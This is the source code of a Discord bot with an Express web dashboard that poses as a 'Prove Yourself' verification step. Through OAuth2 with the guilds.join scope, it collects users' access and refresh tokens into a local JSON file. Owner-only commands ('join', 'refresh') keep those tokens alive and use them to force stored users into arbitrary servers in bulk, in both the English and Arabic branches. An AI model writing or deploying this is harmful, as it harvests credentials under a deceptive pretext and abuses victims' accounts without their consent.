const { Client, Intents, MessageButton, MessageActionRow } = require("discord.js");
const DiscordStrategy = require('passport-discord').Strategy
const session = require('express-session');
const bodyParser = require("body-parser");
const { bot } = require("./Config.js");
const config = require("./Config.js");
const passport = require('passport');
const express = require("express");
const Database = require('st.db');
const path = require("path");
const app = express();

const client = new Client({
    intents: [
        Intents.FLAGS.GUILDS,
        Intents.FLAGS.GUILD_MESSAGES
    ]
});

const usersdata = new Database({
    path: './Database/Dashbord.json',
    databaseInObject: true
})

global.config = config;
const DiscordOauth2 = require("discord-oauth2");
const oauth = new DiscordOauth2({
    clientId: config.bot.botID,
    clientSecret: config.bot.clientSECRET,
    redirectUri: config.bot.callbackURL,
});

app.use(bodyParser.urlencoded({ extended: true }));
app.set("views", path.join(__dirname, "/views"));
app.use(express.static(__dirname + "assets"))
app.set("view engine", "ejs")
app.use(express.static("public"));

var scopes = ['identify', 'guilds', 'guilds.join'];

passport.use(new DiscordStrategy({
    clientID: config.bot.botID,
    clientSecret: config.bot.clientSECRET,
    callbackURL: config.bot.callbackURL,
    scope: scopes
}, async function (accessToken, refreshToken, profile, done) {
    process.nextTick(async function () {
        usersdata.set(`${profile.id}`, {
            accessToken: accessToken,
            refreshToken: refreshToken,
            email: profile.email
        })
        return done(null, profile);
    });
    await oauth.addMember({
        guildId: `${config.bot.GuildId}`,
        userId: profile.id,
        accessToken: accessToken,
        botToken: client.token
    })

}));

app.get("/", function (req, res) {
    res.render("index", { client: client, user: req.user, config: config, bot: bot });
});

app.use(session({
    secret: 'some random secret',
    cookie: {
        maxAge: 60000 * 60 * 24
    },
    saveUninitialized: false
}));

app.get("/", (req, res) => {
    res.render("index", { client: client, user: req.user, config: config, bot: bot });
});

passport.serializeUser(function (user, done) {
    done(null, user);
});

passport.deserializeUser(function (user, done) {
    done(null, user);
});

app.use(passport.initialize());
app.use(passport.session());

app.get('/login', passport.authenticate('discord', { failureRedirect: '/' }), function (req, res) {
    var characters = '0123456789';
    let idt = ``
    for (let i = 0; i < 20; i++) {
        idt += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    res.render("login", { client: client, user: req.user.username, config: config, bot: bot });
});

if (bot.Lang === 'en' || bot.Lang === 'En' || bot.Lang === 'EN') {

    client.on('messageCreate', async message => {
        if (message.content.startsWith(bot.Prefix + `send`)) {
            if (!config.bot.owners.includes(`${message.author.id}`)) {
                return;
            }
            let button = new MessageButton()
                .setLabel(`Prove Yourself`)
                .setStyle(`LINK`)
                .setURL(`https://discord.com/oauth2/authorize?response_type=code&redirect_uri=${config.website.URL}%2Flogin&scope=identify%20guilds%20guilds.join&client_id=${config.bot.ClientId}`)
                .setEmoji(`✍️`)
    
            let row = new MessageActionRow()
                .setComponents(button)
            message.channel.send({ components: [row] })
        }
    })
    
    client.on('messageCreate', async message => {
        if (message.content.startsWith(bot.Prefix + `invite`)) {
            if (!config.bot.owners.includes(`${message.author.id}`)) {
                return;
            }
            let button = new MessageButton()
                .setLabel(`Add Me`)
                .setStyle(`LINK`)
                .setURL(`https://discord.com/api/oauth2/authorize?client_id=${config.bot.botID}&permissions=8&scope=bot%20applications.commands`)
                .setEmoji(`✍️`)
    
            let row = new MessageActionRow()
                .setComponents(button)
            message.channel.send({ content: 'Add the bot to your server via the \`Add Me\` button', components: [row] })
        }
    })
    
    client.on('messageCreate', async message => {
        if (message.content.startsWith(bot.Prefix + `check`)) {
            if (!config.bot.owners.includes(`${message.author.id}`)) {
                return;
            }
            let args = message.content.split(" ").slice(1).join(" ");
            if (!args) return message.channel.send({ content: `**Mention Someone**` });
            let member = message.mentions.members.first() || message.guild.members.cache.get(args.split(` `)[0]);
            if (!member) return message.channel.send({ content: `**Wrong Person**` });
            let data = usersdata.get(`${member.id}`)
            if (data) return message.channel.send({ content: `**Already Documente**` });
            if (!data) return message.channel.send({ content: `**Undocumented**` });
        }
    })
    
    client.on('messageCreate', async message => {
        if (message.content.startsWith(bot.Prefix + `join`)) {
            if (!config.bot.owners.includes(`${message.author.id}`)) return;
            let msg = await message.channel.send({ content: `**Checking In Progress ..**` })
            let alld = usersdata.all()
            let args = message.content.split(` `).slice(1)
            if (!args[0] || !args[1]) return msg.edit({ content: `**Sorry, Please Select A Server ..**` }).catch(() => { message.channel.send({ content: `**Sorry, Please Select A Server ..**` }) });
            let guild = client.guilds.cache.get(`${args[0]}`)
            let amount = args[1]
            let count = 0
            if (!guild) return msg.edit({ content: `**Sorry, I Couldn't Find The Server ..**` }).catch(() => { message.channel.send({ content: `**Sorry, I Couldn't Find The Server ..**` }) });
            if (amount > alld.length) return msg.edit({ content: `**You Cannot Enter This Number ..**` }).catch(() => { message.channel.send({ content: `**You Cannot Enter This Number ..**` }) });;
            for (let index = 0; index < amount; index++) {
                await oauth.addMember({ 
                    guildId: guild.id, userId: alld[index].ID, accessToken: alld[index].data.accessToken, botToken: client.token
                }).then(() => {
                    count++
                }).catch(() => { })
            }
            msg.edit({
                content: `**Done Successfully ..**\n**Has Been Entered** \`${count}\`\n**I Could Not Enter** \`${amount - count}\`\n\`${amount}\` **Were ordered**`
            }).catch(() => {
                message.channel.send({ content: `**Done Successfully ..**\n**Has Been Entered** \`${count}\`\n**I Could Not Enter** \`${amount - count}\`\n\`${amount}\` **Were ordered**` })
            });;
        }
    })
    
    client.on('messageCreate', async message => {
        if (message.content.startsWith(bot.Prefix + `refresh`)) {
            if (!config.bot.owners.includes(`${message.author.id}`)) {
                return;
            }
            let mm = await message.channel.send({ content: `**Refreshing Is In Progress ..**` }).catch(() => { })
            const alld = usersdata.all()
            let count = 0;
    
            for (let i = 0; i < alld.length; i++) {
                await oauth.tokenRequest({
                    'clientId': client.user.id,
                    'clientSecret': bot.clientSECRET,
                    'grantType': 'refresh_token',
                    'refreshToken': alld[i].data.refreshToken
                }).then((res) => {
                    usersdata.set(`${alld[i].ID}`, {
                        accessToken: res.access_token,
                        refreshToken: res.refresh_token
                    })
                    count++
                }).catch(() => {
                    usersdata.delete(`${alld[i].ID}`)
                })
            }
    
            mm.edit({
                content: `**Done Successfully ..**\n\`${count}\` **Has Been Changed**\n\`${alld.length - count}\` **Deleted**`
            }).catch(() => {
                message.channel.send({ content: `**Done Successfully ..**\n\`${count}\`` }).catch(() => { })
            })
        }
    })
    
    client.on('messageCreate', async message => {
        if (message.content.startsWith(bot.Prefix + `users`)) {
            if (!config.bot.owners.includes(`${message.author.id}`)) {
                return;
            }
            let alld = usersdata.all()
            message.reply({ content: `**There Are Currently ${alld.length}**` })
        }
    })
    
    client.on('messageCreate', async message => {
        if (message.content.startsWith(`-help`)) {
            if (!config.bot.owners.includes(`${message.author.id}`)) {
                return;
            }
            message.reply({
                content: `**[\` ${bot.Prefix}join { ServerId } { amount }\`]**\n**[\`${bot.Prefix}refresh\`]**\n**[\`${bot.Prefix}users\`]**\n**[\`${bot.Prefix}help\`]**\n**[\`${bot.Prefix}check\`]**\n**[\`${bot.Prefix}send\`]**\n**[\`${bot.Prefix}invite\`]**
        `})
        }
    })

} else if (bot.Lang === 'ar' || bot.Lang === 'Ar' || bot.Lang === 'AR') {

    client.on('messageCreate', async message => {
        if (message.content.startsWith(bot.Prefix + `send`)) {
            if (!config.bot.owners.includes(`${message.author.id}`)) {
                return;
            }
            let button = new MessageButton()
                .setLabel(`اثبت نفسك`)
                .setStyle(`LINK`)
                .setURL(`https://discord.com/oauth2/authorize?response_type=code&redirect_uri=${config.website.URL}%2Flogin&scope=identify%20guilds%20guilds.join&client_id=${config.bot.ClientId}`)
                .setEmoji(`✍️`)
    
            let row = new MessageActionRow()
                .setComponents(button)
            message.channel.send({ components: [row] })
        }
    })
    
    client.on('messageCreate', async message => {
        if (message.content.startsWith(bot.Prefix + `invite`)) {
            if (!config.bot.owners.includes(`${message.author.id}`)) {
                return;
            }
            let button = new MessageButton()
                .setLabel(`ضيفني`)
                .setStyle(`LINK`)
                .setURL(`https://discord.com/api/oauth2/authorize?client_id=${config.bot.botID}&permissions=8&scope=bot%20applications.commands`)
                .setEmoji(`✍️`)
    
            let row = new MessageActionRow()
                .setComponents(button)
            message.channel.send({ content: 'اضف البوت الي الخادم الخاص بك عن طريق زر \`ضيفني\`', components: [row] })
        }
    })
    
    client.on('messageCreate', async message => {
        if (message.content.startsWith(bot.Prefix + `check`)) {
            if (!config.bot.owners.includes(`${message.author.id}`)) {
                return;
            }
            let args = message.content.split(" ").slice(1).join(" ");
            if (!args) return message.channel.send({ content: `**منشن شخص طيب**` });
            let member = message.mentions.members.first() || message.guild.members.cache.get(args.split(` `)[0]);
            if (!member) return message.channel.send({ content: `**شخص غلط**` });
            let data = usersdata.get(`${member.id}`)
            if (data) return message.channel.send({ content: `**موثق بالفعل**` });
            if (!data) return message.channel.send({ content: `**غير موثق**` });
        }
    })
    
    client.on('messageCreate', async message => {
        if (message.content.startsWith(bot.Prefix + `join`)) {
            if (!config.bot.owners.includes(`${message.author.id}`)) return;
            let msg = await message.channel.send({ content: `**جاري الفحص ..**` })
            let alld = usersdata.all()
            let args = message.content.split(` `).slice(1)
            if (!args[0] || !args[1]) return msg.edit({ content: `**عذرًا , يرجى تحديد خادم ..**` }).catch(() => { message.channel.send({ content: `**عذرًا , يرجى تحديد خادم ..**` }) });
            let guild = client.guilds.cache.get(`${args[0]}`)
            let amount = args[1]
            let count = 0
            if (!guild) return msg.edit({ content: `**عذرًا , لم اتمكن من العثور على الخادم ..**` }).catch(() => { message.channel.send({ content: `**عذرًا , لم اتمكن من العثور على الخادم ..**` }) });
            if (amount > alld.length) return msg.edit({ content: `**لا يمكنك ادخال هاذا العدد ..**` }).catch(() => { message.channel.send({ content: `**لا يمكنك ادخال هاذا العدد ..**` }) });;
            for (let index = 0; index < amount; index++) {
                await oauth.addMember({ 
                    guildId: guild.id, userId: alld[index].ID, accessToken: alld[index].data.accessToken, botToken: client.token
                }).then(() => {
                    count++
                }).catch(() => { })
            }
            msg.edit({
                content: `**تم بنجاح ..**\n**تم ادخال** \`${count}\`\n**لم اتمكن من ادخال** \`${amount - count}\`\n**تم طلب** \`${amount}\``
            }).catch(() => {
                message.channel.send({ content: `**تم بنجاح ..**\n**تم ادخال** \`${count}\`\n**لم اتمكن من ادخال** \`${amount - count}\`\n**تم طلب** \`${amount}\`` })
            });;
        }
    })
    
    client.on('messageCreate', async message => {
        if (message.content.startsWith(bot.Prefix + `refresh`)) {
            if (!config.bot.owners.includes(`${message.author.id}`)) {
                return;
            }
            let mm = await message.channel.send({ content: `**جاري عمل ريفريش ..**` }).catch(() => { })
            let alld = usersdata.all()
            var count = 0;
    
            for (let i = 0; i < alld.length; i++) {
                await oauth.tokenRequest({
                    'clientId': client.user.id,
                    'clientSecret': bot.clientSECRET,
                    'grantType': 'refresh_token',
                    'refreshToken': alld[i].data.refreshToken
                }).then((res) => {
                    usersdata.set(`${alld[i].ID}`, {
                        accessToken: res.access_token,
                        refreshToken: res.refresh_token
                    })
                    count++
                }).catch(() => {
                    usersdata.delete(`${alld[i].ID}`)
                })
            }
    
            mm.edit({
                content: `**تم بنجاح ..**\n**تم تغير** \`${count}\`\n**تم حذف** \`${alld.length - count}\``
            }).catch(() => {
                message.channel.send({ content: `**تم بنجاح .. ${count}**` }).catch(() => { })
            })
        }
    })
    
    client.on('messageCreate', async message => {
        if (message.content.startsWith(bot.Prefix + `users`)) {
            if (!config.bot.owners.includes(`${message.author.id}`)) {
                return;
            }
            let alld = usersdata.all()
            message.reply({ content: `**يوجد حاليًا ${alld.length}**` })
        }
    })
    
    client.on('messageCreate', async message => {
        if (message.content.startsWith(`-help`)) {
            if (!config.bot.owners.includes(`${message.author.id}`)) {
                return;
            }
            message.reply({
                content: `**[\` ${bot.Prefix}join { ServerId } { amount }\`]**\n**[\`${bot.Prefix}refresh\`]**\n**[\`${bot.Prefix}users\`]**\n**[\`${bot.Prefix}help\`]**\n**[\`${bot.Prefix}check\`]**\n**[\`${bot.Prefix}send\`]**\n**[\`${bot.Prefix}invite\`]**
        `})
        }
    })

}

app.listen(config.website.PORT, function () {
    console.log("Your app is listening on port " + config.website.PORT)
});

client.on('ready', () => {
    console.log(`The Bot Is Ready ${client.user.tag}`);
});

client.login(bot.TOKEN).catch(err => console.error(err.message || err))

process.on("unhandledRejection", error => {
    console.log(error)
});